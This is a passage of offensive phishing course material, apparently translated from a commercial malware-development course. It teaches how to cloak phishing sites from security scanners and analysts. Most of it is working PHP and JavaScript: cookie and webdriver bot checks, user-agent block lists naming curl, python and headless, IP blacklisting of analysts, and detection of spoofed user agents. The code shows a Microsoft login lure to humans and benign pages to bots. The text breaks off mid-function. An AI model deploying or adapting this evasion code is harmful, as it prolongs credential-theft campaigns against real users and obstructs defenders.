---
title: "Anti-Analysis & Obfuscation"
---

# 05. Anti-Análise e Ofuscação em Phishing

## Detectado em Minutos Sem Técnicas de Evasão

Scanners automatizados e defensores analisam continuamente páginas phishing. Sem técnicas de anti-análise, o conteúdo malicioso é detectado, assinado e bloqueado em minutos. Esta seção cobre técnicas para detectar bots, dificultar análise manual e ofuscar o código frontend.

Os módulos a seguir foram traduzidos e transcritos do curso MalDev Academy - Offensive Phishing Operations (Módulos 37-59).

---

# Módulo 37 — Anti-Análise Via Verificação de Cookies

Módulo 37 — Anti-Analysis Via Cookie Check

# Disclaimer

## Introdução
Anti-analysis techniques are methods implemented on phishing websites to obstruct both automated and manual efforts to analyze and understand the website's underlying purpose or intent. Due to the rise in automated scanning in recent years, anti-analysis techniques have become a necessary component in phishing websites. With the integration of anti-analysis techniques into our phishing website, it can potentially extend the website's lifespan by evading detection and making it harder for defenders to analyze.

In this module, we will explore a basic anti-analysis technique that verifies whether the user has cookies enabled. This check is useful because the absence of cookies is associated with bot or analysis activity, making it a useful indicator for distinguishing between legitimate users and users analyzing our website.

## Objeto Navigator
The Navigator object is a built-in JavaScript object that provides information about the user's browser and operating system. It contains several properties and methods that allow us to access broad details about the connecting client. One of these properties is the cookieEnabled property. If this property is set to `true`, then the user's browser supports and has cookies enabled. The JavaScript code below checks the `navigator.cookieEnabled` property to determine whether cookies are enabled or disabled.

```
if (navigator.cookieEnabled) {
    console.log('Cookies are enabled! Likely human');
} else {
    console.log('Cookies are disabled! Likely bot');
}

```

## Verificação Client-Side de Cookie
While the `cookieEnabled` property is useful, it's important to note that `navigator` properties can be spoofed through different methods. For example, puppeteer-extra-plugin-stealth can be used to override `navigator` properties in an automation browser to appear more like a legitimate browser, masking the fact that it is an automated script or bot.

Therefore, a more reliable way to determine if cookies are enabled is to set a cookie to a specific value and then attempt to read that value immediately. If the cookie is successfully retrieved, it indicates that cookies are enabled. Otherwise, it suggests that cookies are disabled or blocked.

The `checkCookies` function sets a cookie named `maldev_cookie` with a predefined value, `maldevacademy`, and then retrieves all cookies from the document. It parses the cookies into a key-value object and checks whether the `maldev_cookie` exists and retrieves its assigned value. If the stored value matches, it confirms that cookies are enabled. If the cookie is missing or cannot be set, it suggests that cookies are disabled or blocked.

```
function checkCookies() {

    // Set cookie (maldev_cookie)
    const cookieVal = 'maldevacademy';
    document.cookie = `maldev_cookie=${cookieVal}; path=/;`;

    // Retrieve all cookies
    const cookies = {};
    document.cookie.split('; ').forEach(cookie => {
        const [name, value] = cookie.split('=');
        cookies[name] = value;
    });

    // Check the value of the maldev_cookie
    if (cookies.maldev_cookie === cookieVal) {
        console.log("Human detected: Cookies are enabled.");
    } else {
        console.log("Bot detected: Cookies are disabled or not supported.");
    }
}

checkCookies();

```
The images below show the results when cookies are enabled versus when they are disabled, respectively.

## Verificação Server-Side de Cookie
Another way to check if cookies are enabled is by setting a cookie with a specific value as soon as the user lands on the website and then redirecting to a different page or subdomain to see if the cookie persists. If the cookie can be successfully retrieved after the user is redirected, it confirms that cookies are enabled and functioning correctly.

The PHP script below uses the `setcookie` function to set a cookie named `maldev_cookie` to the value `maldevacademy` and then redirects the user to `login.php`.

```
<?php
$cookieName = 'maldev_cookie';
$cookieValue = 'maldevacademy';
$path = '/';
$expiration = time() + 3600;

setcookie($cookieName, $cookieValue, $expiration, $path, "", false, false);

header('Location: login.php');
exit();
?>

```
The `login.php` script will search for the `maldev_cookie`, if it's found then we know that cookies are enabled, otherwise cookies are disabled.

```
<?php
if (isset($_COOKIE['maldev_cookie'])) {
    echo "Cookie found.";
} else {
    echo "No cookie found. User is a bot";
    // Redirect user away from the website
    // header('Location: https://google.com');
    // exit();
}
?>

```

## Demo
The videos below show the results when cookies are enabled versus disabled, respectively.

Cookies Enabled

The video can be found in folder: `./videos/cookies-enabled-server-side.mov`

Cookies Disabled

The video can be found in folder: `./videos/cookies-disabled-server-side.mp4`

## Conclusão
By verifying whether cookies are enabled and persisting across sessions, we're able to detect abnormal clients and block them.

## Objetivos
Use the navigator object to check if cookies are enabled

Set a cookie using JavaScript and then verify that the cookie was set

Perform a server-side cookie check, if the expected cookie was not found, display a static benign HTML page


---

# Módulo 38 — Detecção de Browsers Headless via Propriedade WebDriver

Módulo 38 — Detecting Headless Browsers Via WebDriver Property

# Disclaimer

## Introdução
In a previous module, we explored how the `navigator` object can be used to check if cookies are enabled, serving as a method for anti-analysis. Another useful property of the `navigator` object is the webdriver property. This property provides information regarding whether the client is a headless browser, commonly used for automated tasks, which can be used to identify automated clients.

This module will demonstrate a simple and yet effective method of detecting automated clients accessing our phishing website.

## Browser Headless
A headless browser is a web browser that does not utilize a user interface and instead runs in the background. This is usually used for testing purposes that do not require any graphical user interface. The majority of web browsers can be executed in headless mode including Chrome, MS Edge, and Firefox.

For example, the command below runs Chrome in headless mode to access `example.com` and capture a screenshot of the webpage.

```
"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --disable-gpu --screenshot="C:\path\to\save\screenshot.png" --window-size=1280,720 https://www.example.com

```

## Propriedade Webdriver
When a headless browser visits our phishing website, the interaction with our website will likely be automated as part of an effort to analyze our website. Fortunately, headless browsers typically set the `navigator.webdriver` property to `true` when the browser is in headless mode, providing us with a straightforward way to detect headless browsers that do not spoof this property.

Using the simple JavaScript snippet below, we can check if the `navigator.webdriver` property is set to `true` and detect the headless browser.

```
if (navigator.webdriver) {
    document.write("Headless browser detected");
} else {
    document.write("Not a headless browser");
}

```

## Demo
Place the JavaScript snippet above inside `<script>` tags and place it inside an `.html` file and then access the website normally using any ordinary browser. Notice the output will indicate correctly that this is not a headless browser.

Next, use the headless Chrome command or paste the link into a service that likely utilizes headless browsers such as GeoPeeker. The output will now indicate that the browser is in fact a headless browser.

## Conclusão
The `navigator.webdriver` property is a straightforward and effective way to identify whether a client is an automated bot or a real user. Since legitimate users never have this property enabled, blocking any client with `navigator.webdriver` set to `true` is a reliable approach.

## Objetivos
Use the webdriver property to block bots from viewing the phishing content

Use a Chromium browser in headless mode to access your phishing website and take a screenshot


---

# Módulo 39 — Anti-Bot Via Filtragem de User-Agent

Módulo 39 — Anti-Bot Via User Agent Filtering

# Disclaimer

## Introdução
Analyzing the user agent of the client accessing the phishing website is a basic technique for identifying whether the visitor is a human or a bot. While straightforward, this method has its limitations, as user agents can be easily spoofed by sophisticated clients. However, it remains an effective initial filter to filter out unsophisticated bots and automated tools that fail to properly emulate legitimate user agents. Combining this approach with other detection techniques can enhance its reliability.

## Detecção e Filtragem de User-Agent
One of the simplest anti-bot techniques involves the analysis of the `User-Agent` HTTP header. Many tools and internet scanners set their `User-Agent` header to a custom value that identifies the tool or scanner. Additionally, inexperienced users might try to analyze our phishing website with tools and forget to set a custom `User-Agent`, making it easy for us to detect that our website is being analyzed. For example, someone trying to retrieve the content of our website via `curl` may run the following command:

```
curl https://phishing-example.com

```
This command would send out the HTTP request with the user agent `curl/8.4.0`. This is a clear indication that the website is not being accessed directly by a human and therefore the phishing content should not be served. User agent detection and filtering should be implemented on the server side as JavaScript will not execute when simple command line tools such as `curl` are used.

## Spoofing de User-Agent
User agent filtering alone is not considered a sufficient anti-bot technique because user agents can be easily spoofed. Continuing with our `curl` example, the `-H` flag can be used to set the `User-Agent` header to a custom value.

```
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" https://phishing-example.com

```

In the remainder of this module, we will discuss the different ways of implementing user agent filtering to maximize the effect of this technique.

## Blacklisting de User-Agents
The first way that we can implement user agent filtering is via blacklisting known bot user agent keywords. For example, using the PHP script below, any request that has a user agent with the keywords `curl`, `headless`, `python` will be redirected to `blocked.php` and a message stating "You are a bot" will be displayed. On the other hand, if the user agent does not match any of the blacklisted keywords, the user will be redirected to `microsoft-login.php` (i.e. the phishing page) and a message stating "You are not a bot" will be displayed.

```
<?php
// Keywords to search for in user agents
$blockedKeywords = array('curl', 'headless', 'python');

// Get the user agent from the request
// Convert it to lower case to avoid case sensitivity issues
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);

// Check if the user agent contains any blocked keywords
foreach ($blockedKeywords as $keyword) {
    if (strpos($userAgent, $keyword) !== false) {
        // Redirect to a benign page
        echo "You are a bot\n";
        header('Location: blocked.php');
        exit;
    }
}

// Show the phishing content
echo "You are not a bot\n";
header('Location: microsoft-login.php');
exit;
?>

```
Using `curl` to request our phishing website results in a redirect to `/blocked.php`. Use the `-I` flag to send a HEAD request to view the server's response headers.

### Improving User Agent Blacklisting
Our current method of blacklisting is insufficient because it relies on a limited array of only three keywords. Expanding this array to enhance our filtering capabilities would be a time-consuming process. Therefore, we will improve our user agent blacklisting technique by checking the publicly available crawler-user-agents.json file to see if there is a match.

To start, download the file onto your server and place it outside of your web root to ensure the file is inaccessible to users on the internet. This is an opsec measure to avoid raising suspicion in case the file is accidentally discovered.

```
# Download the file via curl
# Validate the link still works first
curl -L https://raw.githubusercontent.com/monperrus/crawler-user-agents/master/crawler-user-agents.json -o crawler-user-agents.json

# Move the file outside of the web root
mv crawler-user-agents.json /var/www

```
The updated PHP script extracts the incoming request's `User-Agent` string and compares it against the stored bot patterns using regular expressions. If a match is found, the script identifies the request as a bot, displays a message, and redirects the visitor to `blocked.php`. If no match is found, the visitor is considered a human and is redirected to `microsoft-login.php`.

```
<?php
// Load the JSON file and decode it
$jsonFile = '/var/www/crawler-user-agents.json'; // The full path to crawler-user-agents.json
$botList = json_decode(file_get_contents($jsonFile), true);

// The request's user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Helper function to check if the user agent matches any bot patterns
function isBot($userAgent, $botList) {
    foreach ($botList as $bot) {
        // Check if there's a match
        if (preg_match('/' . $bot['pattern'] . '/i', $userAgent)) {
            return true;
        }
    }
    return false;
}

// Block the request if it's a bot
if (isBot($userAgent, $botList)) {
    echo "You are a bot\n";
    header('Location: blocked.php');
    exit;
}

echo "You are not a bot\n";
header('Location: microsoft-login.php');
?>

```

There are alternative pre-made lists of bad user agents such as bad-user-agents.list or suspicious_http_user_agents_list.csv.

## Whitelisting de User-Agents
Instead of blacklisting user agents, you can also whitelist user agents. This means that you will only allow requests that have a specific keyword or keywords in the user agent. In the PHP script below, we've whitelisted four keywords: Chrome, Firefox, Edg (Microsoft Edge), and Version (Safari) and we've made the check case-sensitive as these words are capitalized in legitimate requests. When implementing whitelisting, it's important to strike a balance between being sufficiently strict to filter out bots and not being overly restrictive, which could inadvertently block legitimate requests.

```
<?php
// Whitelisted keywords in user agents (case-sensitive)
// Safari uses "Version"
// Newer Edge versions uses "Edg"
$whitelistedKeywords = array('Chrome', 'Firefox', 'Edg', 'Version');

// Get the user agent from the request
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Flag to determine if the user agent is whitelisted
$isWhitelisted = false;

// Check if the user agent contains any whitelisted keywords (case-sensitive)
foreach ($whitelistedKeywords as $keyword) {
    if (strpos($userAgent, $keyword) !== false) {
        $isWhitelisted = true;
        break;
    }
}

// If the user agent is not whitelisted, redirect to a benign page
if (!$isWhitelisted) {
    echo "You are a bot\n";
    header('Location: blocked.php');
    exit;
}

// If the user agent is whitelisted, show the phishing content
echo "You are not a bot\n";
header('Location: microsoft-login.php');
exit;
?>

```

## User-Agents Anômalos
Spoofed user agents can sometimes be detected via anomalous indicators, such as an unusually low browser version or improper casing, like uppercase or lowercase letters in unexpected places within the user agent string. These subtle inconsistencies can signal that the user agent has been manually altered or spoofed.

### Blocking Old Browser Versions
Blocking old browser versions is one strategy to filter out scanners and sandboxes that do not update their user agent. The PHP script below will block any request made if the Chrome version is below 100. For context, the current version of Chrome as of writing this module is 132 and therefore, users in enterprise organizations are likely not running Chrome below version 100. Similarly to user agent whitelisting, tightening restrictions on version numbers may risk blocking legitimate requests.

```
<?php
// Request's user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Helper function to extract Chrome version
function getChromeVersion($userAgent) {
    // Regex to match Chrome version
    if (preg_match('/Chrome\/(\d+)/', $userAgent, $matches)) {
        return (int)$matches[1];
    }
    return null;
}

// Get the Chrome version
$chromeVersion = getChromeVersion($userAgent);

// Block the request if the Chrome version is below 100
if ($chromeVersion !== null && $chromeVersion < 100) {
    // Redirect to a benign page
    echo "You are a bot\n";
    header('Location: blocked.php');
    exit;
}

// Show the phishing content
echo "You are not a bot\n";
header('Location: microsoft-login.php');
?>

```

The previous script only works for Chrome whereas the updated script below incorporates version checks for the four main browsers.

```
<?php
// Request's user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Helper function to extract browser versions
function getBrowserVersion($userAgent, $browser) {
    // Regex patterns to match the four main browsers and their version
    $patterns = [
        'Chrome' => '/Chrome\/(\d+)/',
        'Firefox' => '/Firefox\/(\d+)/',
        'Edge' => '/Edg\/(\d+)/',
        'Safari' => '/Version\/(\d+)/'
    ];

    // Match the version based on the browser type
    if (isset($patterns[$browser])) {
        if (preg_match($patterns[$browser], $userAgent, $matches)) {
            return (int)$matches[1];
        }
    }
    return null;
}

// Determine the browser and its version
$chromeVersion = getBrowserVersion($userAgent, 'Chrome');
$firefoxVersion = getBrowserVersion($userAgent, 'Firefox');
$edgeVersion = getBrowserVersion($userAgent, 'Edge');
$safariVersion = getBrowserVersion($userAgent, 'Safari');

// Modify the version requirements
if (($chromeVersion !== null && $chromeVersion >= 100) ||
    ($firefoxVersion !== null && $firefoxVersion >= 100) ||
    ($edgeVersion !== null && $edgeVersion >= 100) ||
    ($safariVersion !== null && $safariVersion >= 16)) {
    // Show the phishing content
    echo "You are not a bot\n";
    header('Location: microsoft-login.php');
    exit;
} else {
    // Redirect to a benign page
    echo "You are a bot\n";
    header('Location: blocked.php');
    exit;
}
?>

```
Some user agents that would be blocked due to old versions are shown below.

```
// Firefox
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0

// Edge
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.51

// Chrome
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36

```

### Missing User Agent
Legitimate HTTP requests should usually include the `User-Agent` HTTP header. If the header is not included, we can assume that the request is not being made by a human. Detecting a missing user agent can be done by making changes directly to Apache's configuration. This method requires `mod_rewrite` to be enabled which can be done via:

```
sudo a2enmod rewrite

```
Traverse to your website's virtual host configuration (e.g. `/etc/apache2/sites-available/000-default.conf`) and place the following lines into the configuration file.

```
# Enable Rewrite Engine
RewriteEngine On

# Check if User-Agent header is missing
# If header is missing, redirect to blocked.php
RewriteCond %{HTTP_USER_AGENT} ^$
RewriteRule ^ /blocked.php [L,R=302]

```
Make sure to restart Apache once you've updated the configuration file using `systemctl restart apache2`. Once Apache is restarted, run `curl` with `--user-agent ""` to prevent sending a `User-Agent` header in the HTTP request.

## Blacklisting User Agents and IPs
When someone is conducting manual analysis on our website, they might accidentally forget to set a custom `User-Agent`, resulting in requests being made with their tool's default user agent (e.g., `curl`, `python-requests`, etc.). We can take advantage of this mistake by logging and blacklisting IP addresses that have used these default user agents. Therefore, any future requests from these IPs, even if they use a legitimate user agent, will be blocked or redirected to benign content.

Start by creating the `ip_blacklist.txt` file and allowing the web server to write to it using the commands below:

```
# Create file
touch /var/www/ip_blacklist.txt

# Fix write permissions
chown www-data:www-data ip_blacklist.txt

```
Next, add the PHP script below to a file named `blacklist_ips.php`. The script will check if a client's IP address is blacklisted in the `ip_blacklist.txt` file. If it isn't, it will analyze the `User-Agent` for blacklisted keywords. If a match is found, it will blacklist the IP and redirect them to `blocked.php`. If no match is found, it will redirect them to `microsoft-login.php`.

```
<?php
// File path to store blacklisted IP addresses
// Make sure www-data can write to the path (recall chown www-data:www-data .)
$ipBlacklistFile = '/var/www/ip_blacklist.txt';

// Function to check if an IP is blacklisted
function isIpBlacklisted($ip, $ipBlacklistFile) {
    if (file_exists($ipBlacklistFile)) {
        $blacklistedIps = file($ipBlacklistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (in_array($ip, $blacklistedIps)) {
            return true;
        }
    }
    return false;
}

// Function to log an IP address to the blacklist file
function blacklistIp($ip, $ipBlacklistFile) {
    file_put_contents($ipBlacklistFile, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// Get the client's IP address
$clientIp = $_SERVER['REMOTE_ADDR'];

// Check if the IP is already blacklisted
if (isIpBlacklisted($clientIp, $ipBlacklistFile)) {
    // Redirect to a benign page
    echo "You are a bot\n";
    header('Location: blocked.php');
    exit;
}

// Keywords to search for in user agents
$blockedKeywords = array('curl', 'headless', 'python');

$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);

// Check if the user agent contains any blocked keywords
foreach ($blockedKeywords as $keyword) {
    if (strpos($userAgent, $keyword) !== false) {
        // Log the IP address to the blacklist file
        blacklistIp($clientIp, $ipBlacklistFile);

        // Redirect to a benign page
        echo "You are a bot\n";
        header('Location: blocked.php');
        exit;
    }
}

// Show the phishing content
echo "You are not a bot\n";
header('Location: microsoft-login.php');
?>

```
In the image below, the first request is made with a `curl` user agent, resulting in our IP address being blacklisted. Additionally, all subsequent requests are blocked, regardless of the user-agent.

## Conclusão
User agent filtering is a simple technique that can be used to detect automated and manual analysis with low capabilities or clear intent. Blacklisting common bot and crawler user agents should be performed as it helps reduce the amount of automated traffic accessing out phishing website. Furthermore, much older browser versions should be blocked from accessing our website as they are usually associated with bot traffic.

## Objetivos
Whitelist Chrome user agents that are version 125 and above

Blacklist the IP address of any client that is not using Microsoft Edge

Create a PHP script that checks crawler-user-agents.json for a pattern match and ensures the browser version was released this year (Hint: Search browser version release dates)


---

# Módulo 40 — Anti-Bot Via Detecção de Spoofing de User-Agent

Módulo 40 — Anti-Bot Via User-Agent Spoofing Detection

- # Módulo 40 — Anti-Bot Via Detecção de Spoofing de User-Agent

# Disclaimer

## Introdução
In the Anti-Bot Via User Agent Filtering module, several methods for filtering out unwanted and suspicious user agents were discussed. However, it was emphasized that user agent spoofing is particularly easy to accomplish, making it an unreliable standalone measure.Security vendors are aware that malicious websites often display different content depending on the user agent. For example, a phishing website may only reveal its payload if it detects a macOS user agent while showing an error page or benign content to other user agents. To counteract this, security scanners may spoof their user agent to trick the phishing site into exposing its payload. By spoofing their user agent, security vendors can efficiently identify malicious behavior without the need for dedicated scanning environments for each operating system or browser, thus reducing operational costs.With that being said, there are several methods used to detect user agent spoofing. Some of these methods are considered "unofficial" because they are not entirely reliable and may be circumvented. Part of the unreliability lies in the fact that these unofficial methods may cease to work in future browser updates. Therefore, any method discussed in this module should be tested prior to its use as an anti-analysis measure.
## Objeto Navigator
The first detection method uses the JavaScript Navigator Object, which provides information about the browser, operating system, and device being used. By examining certain properties, this method can potentially identify inconsistencies that might indicate user agent spoofing. The relevant `navigator` properties are listed below:
navigator.userAgent - Provides the user agent string.

- navigator.platform - Provides a string that represents the platform on which the browser is running (e.g. Macintel, Linux x86_64)

- navigator.appVersion - Provides the browser version number.

- navigator.vendor - Returns the name of the browser vendor (e.g. Google Inc. for Chrome, Apple Computer Inc. for Safari)

If our website is accessed with a spoofed user agent, it should validated with the `navigator.userAgent` to ensure they match, otherwise, the user agent is being spoofed. For example, in the image below, the first user agent value is what the HTTP `User-Agent` header is providing the website, whereas the following one is the user agent returns via `navigator.userAgent`.

The script below captures the `navigator.userAgent` and `navigator.platform` properties from the user's browser and sends them to `validate-user-agent.php` via a `POST` request. If the PHP script returns `match` as `true`, it means that both the `User-Agent` and platform values sent by the client are consistent with what the server detects, suggesting a legitimate request. If `match` is `false`, it indicates a discrepancy.

```
const navigatorData = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
};

fetch('validate-user-agent.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams(navigatorData).toString()
})
.then(response => response.json())
.then(data => {
    if (data.match) {
        console.log('User agent matches navigator properties.');
    } else {
        console.log('User agent does not match navigator properties.');
    }
})
.catch(error => console.error('Error:', error));

```
The PHP script below checks if the HTTP `User-Agent` header matches the `navigator.userAgent` value. Next, it checks if the platform value reported by `navigator.platform` is consistent with the operating system detected in the `User-Agent` string. It validates known platform identifiers for Windows, macOS, and Linux to ensure they align with the expected values. The script then returns a JSON response indicating whether the values match.

```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   
    $clientUserAgent = $_POST['userAgent'];
    $clientPlatform = $_POST['platform'];
    $serverUserAgent = $_SERVER['HTTP_USER_AGENT'];

    $userAgentMatch = stripos($serverUserAgent, $clientUserAgent) !== false; // Check HTTP UA & navigator.userAgent match
    $platformMatch = false;

    if (stripos($serverUserAgent, 'windows') !== false) {
        $platformMatch = in_array($clientPlatform, ['Windows', 'Win32', 'Win64']);
    } elseif (stripos($serverUserAgent, 'mac') !== false) {
        $platformMatch = in_array($clientPlatform, ['Macintosh', 'MacIntel', 'MacOS']);
    } elseif (stripos($serverUserAgent, 'linux') !== false) {
        $platformMatch = in_array($clientPlatform, ['Linux x86_64', 'Linux armv81']);
    }

    echo json_encode([
        'match' => $userAgentMatch && $platformMatch
    ]);
}
?>

```
The video can be found in folder: `./videos/ua-navigator-properties.mov`

### Additional Navigator Properties
The existence of some `navigator` properties can inform us of what browser is being used. For example, the `navigator` properties below are only available on select browsers:

- `navigator.oscpu` - Available only on Firefox.

```
if ('oscpu' in navigator) {
    console.log("User is using Firefox");
}

```

- `navigator.protectedAudience` - Available only on Chromium browsers.

```
if ('protectedAudience' in navigator) {
    console.log("User is using Chromium");
}

```

- `navigator.deprecatedRunAdAuctionEnforcesKAnonymity` - Available only on Chromium browsers.

```
if ('deprecatedRunAdAuctionEnforcesKAnonymity' in navigator) {
    console.log("User is using Chromium");
}

```
The script below verifies whether the user is genuinely using Firefox or a Chromium-based browser by checking the aforementioned properties. For Firefox, it checks if `navigator.oscpu` exists and for Chromium-based browsers, it confirms the presence of `navigator.deprecatedRunAdAuctionEnforcesKAnonymity` and `navigator.protectedAudience`. If these checks fail, it suggests the user agent might be spoofed.

```
const userAgent = navigator.userAgent.toLowerCase();

if (userAgent.includes("firefox")) {
    if ('oscpu' in navigator) {
        console.log("The user agent is Firefox & navigator.oscpu exists.");
    } else {
        console.log("The user agent is spoofed or oscpu property is not accessible.");
    }
} else if (userAgent.includes("chrome") || userAgent.includes("edg")) {
    if ('deprecatedRunAdAuctionEnforcesKAnonymity' in navigator && 'protectedAudience' in navigator) {
        console.log("The user agent is Chromium & both navigator.deprecatedRunAdAuctionEnforcesKAnonymity and navigator.protectedAudience exist.");
    } else {
        console.log("The user agent is spoofed or one of the properties is not accessible.");
    }
} else {
    console.log("The browser is neither Firefox nor Chromium or the user agent is spoofed.");
}

```

It's possible to discover additional `navigator` properties and see which browsers support them by visiting vanilla-cms.org/window.navigator.

## Incompatibilidade de Largura de Tela
This method primarily works when the client is spoofing to a different device, specifically one with a smaller or larger screen. For example, if the user is on desktop and spoofing a mobile device we can check the screen width to validate the client. The screen width can be extracted via screen.width JavaScript property.

The script below collects the user's screen width using `screen.width` and sends it to `validate-screen-size.php` via a `POST` request. The PHP script checks whether the user agent indicates a mobile device and compares the reported screen width to expected values. If the user agent is a mobile device and the screen width is 700 pixels or less, the script considers it a valid match. If the screen width exceeds this threshold while the user agent claims to be mobile, it assumes user agent spoofing.

```
const screenData = {
    screenWidth: screen.width,
};

fetch('validate-screen-size.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams(screenData).toString()
})
.then(response => response.json())
.then(data => {
    if (data.match) {
        console.log('Correct screen size.');
    } else {
        if (data.error) {
            console.log(data.error);
        } else {
            console.log('UA spoofing detected.');
        }
    }
})
.catch(error => {
    console.error('Error:', error);
});

```

```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $serverUserAgent = $_SERVER['HTTP_USER_AGENT'];
    $clientScreenWidth = $_POST['screenWidth'];

    $isMobileUserAgent = preg_match('/Android|iPhone|iPad/i', $serverUserAgent);

    if($isMobileUserAgent) {
        if ($clientScreenWidth <= 700) {
            echo json_encode(['match' => true]);
        } else {
            echo json_encode(['match' => false, 'error' => "UA spoofing detected."]);
        }
    } else {
        echo json_encode(['match' => false, 'error' => "Not a mobile device."]);
    }
}
?>

```
When setting the correct screen size that's associated with the mobile device's user agent, it will not detect user agent spoofing.

However, if the user-agent is modified without the respective screen size, it will detect user agent spoofing.

## Mouse Movement On Mobile Devices
Another method to detect inconsistencies in user agents is by monitoring input events. Since mobile devices primarily use touchscreens, they should trigger the `touchstart` event rather than the `mousemove` event, which is typically associated with mouse input on non-touch devices.

The script below first determines if the user agent is a mobile device. If the user agent suggests a mobile device, it listens for both `mousemove` and `touchstart` events. If mouse movement is detected despite a mobile user agent, it could indicate that the user agent is spoofed.

```
const isMobileUserAgent = /Android|iPhone|iPad/i.test(navigator.userAgent);

if (isMobileUserAgent) {
    window.addEventListener('mousemove', function() {
        console.log('Mouse movement detected on mobile device user agent.');
    });

    window.addEventListener('touchstart', function() {
        console.log('Touch input detected on mobile device user agent.');
    });
} else {
    console.log('Non-mobile user agent detected.');
}

```

## CSS Supported Features
Different browsers lack the support for some CSS features, allowing us to know whether the browser is indeed what's being advertised in the user agent. We can test CSS support for a feature using the `CSS.supports` function. For example, the line of code below tests if the browser supports `-webkit-user-drag` given a value of `none`. This feature is not supported in Firefox, so any client with a user agent identifying as Firefox should always return `false`. If it unexpectedly returns `true`, we can test additional CSS features to determine which browser is being used.

```
// Returns false on Firefox
CSS.supports('-webkit-user-drag','none');

```

Another example is shown below which only returns `true` on Safari.

```
// Returns true only on safari
CSS.supports('-webkit-line-grid','none');

```
As browsers release updates, they may start supporting features that were previously unsupported, so it's important to check the browser's feature support before using them. The website Can I Use is a valuable resource that provides information on feature support across different browsers and versions.

## Mathematical Formulas
Browsers may have subtle differences in their JavaScript engine that can cause a discrepancy when it comes to decimal precision and rounding. We can use these discrepancies to validate the user's claimed browser being advertised in their user agent. For example, the mathematical calculation below results in differences between Firefox and Chrome/Edge/Safari:

```
// Firefox: 56.1124478168614
// Chrome/Edge/Safari: 56.11244781686139
Math.hypot(-24.42, -50.519999999999930000)

```

## Window Attributes
Just as we checked the existence of `navigator` properties, we can apply the same technique to `window` attributes. For example, `window.mozInnerScreenX` and `window.mozInnerScreenY` are exclusive to Firefox, making them useful for verifying a user agent that claims to be Firefox.

It's possible to discover additional `window` properties and see which browsers support them by visiting vanilla-cms.org.

## OS Detection Via Font
The `detectOSSpoofing` function below attempts to verify the user's operating system by determining the OS based on available system fonts and comparing it with the OS reported in `navigator.userAgent`. Since different operating systems have unique default fonts, the function tests for these fonts using the Canvas API and measures text width differences to determine which fonts are present. It first establishes a baseline width using a generic monospace font, then checks whether adding OS-specific fonts changes the width, which indicates the font is available on the system.

If the detected OS from font analysis does not match the OS reported in `navigator.userAgent`, it suggests potential OS spoofing. Keep in mind that this method has limitations, as font availability can be influenced by user-installed fonts or custom configurations.

```
function detectOSSpoofing() {
    const userAgent = navigator.userAgent;

    // OS along with their expected fonts
    const fontsByOS = {
        'Windows': ['Calibri', 'Segoe UI'],
        'MacOS': ['San Francisco', 'Helvetica Neue'],
        'Linux': ['DejaVu Sans', 'Liberation Sans']
    };

    let navigatorUserAgentOS = 'Unknown OS';
    let fontOS = 'Unknown OS';

    if (userAgent.includes('Windows')) {
        navigatorUserAgentOS = 'Windows';
    } else if (userAgent.includes('Mac OS') || userAgent.includes('Macintosh')) {
        navigatorUserAgentOS = 'MacOS';
    } else if (userAgent.includes('Linux')) {
        navigatorUserAgentOS = 'Linux';
    }

    // Use the HTML5 Canvas API to create a 2D canvas
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    context.font = '72px monospace';
    const baselineSize = context.measureText('A').width;

    // Loop through each OS and its associated fonts & check each font to see if it's available
    for (const [os, fonts] of Object.entries(fontsByOS)) {
        for (const font of fonts) {
            context.font = `72px ${font}, monospace`;
            
            // If the font changes the text width then it exists on the system
            if (context.measureText('A').width !== baselineSize) {
                fontOS = os;
                break;
            }
        }
        
        if (fontOS !== 'Unknown OS') {
            break;
        }
    }

    // If the font OS doesn't match the navigator useragent, the OS is probably being spoofed
    if (fontOS !== 'Unknown OS' && fontOS !== navigatorUserAgentOS) {
        document.write(`Potential OS spoofing detected! User-Agent reports: ${navigatorUserAgentOS}, but font detection suggests: ${fontOS}`);
    } else {
        document.write(`OS detection consistent: ${navigatorUserAgentOS}`);
    }
}

```

- The user agent matches the expected font for MacOS

- The user agent reports Windows, but the detected font corresponds to Linux.

## Example: Browser Spoofing Detection
This example will combine the user agent detection techniques mentioned in this module to detect user agent spoofing. The `detectUASpoofing` function will perform the following actions:

- Fetch the user agent from the `navigator.userAgent` property.

- If the user agent is indicating to be a Chromium browser, it verifies the existence of `navigator.deprecatedRunAdAuctionEnforcesKAnonymity` and `navigator.protectedAudience`.

- If the user agent is indicating to be Firefox, it verifies the existence of `navigator.oscpu`.

- If the user agent is indicating to be Safari, it confirms support for the CSS property `-webkit-line-grid`.

```
function detectUASpoofing() {
    const userAgent = navigator.userAgent.toLowerCase();

    var browser;

    // Chromium check
    if (userAgent.includes("chrome") || userAgent.includes("edg")) {
        browser = "chromium";
        if (!('deprecatedRunAdAuctionEnforcesKAnonymity' in navigator && 'protectedAudience' in navigator)) {
            console.log("Spoofing detected for Chromium.");
        }
    } 
    
    // Firefox check
    else if (userAgent.includes("firefox")) {
        browser = "firefox";
        if (!('oscpu' in navigator)) {
            console.log("Spoofing detected for Firefox.");
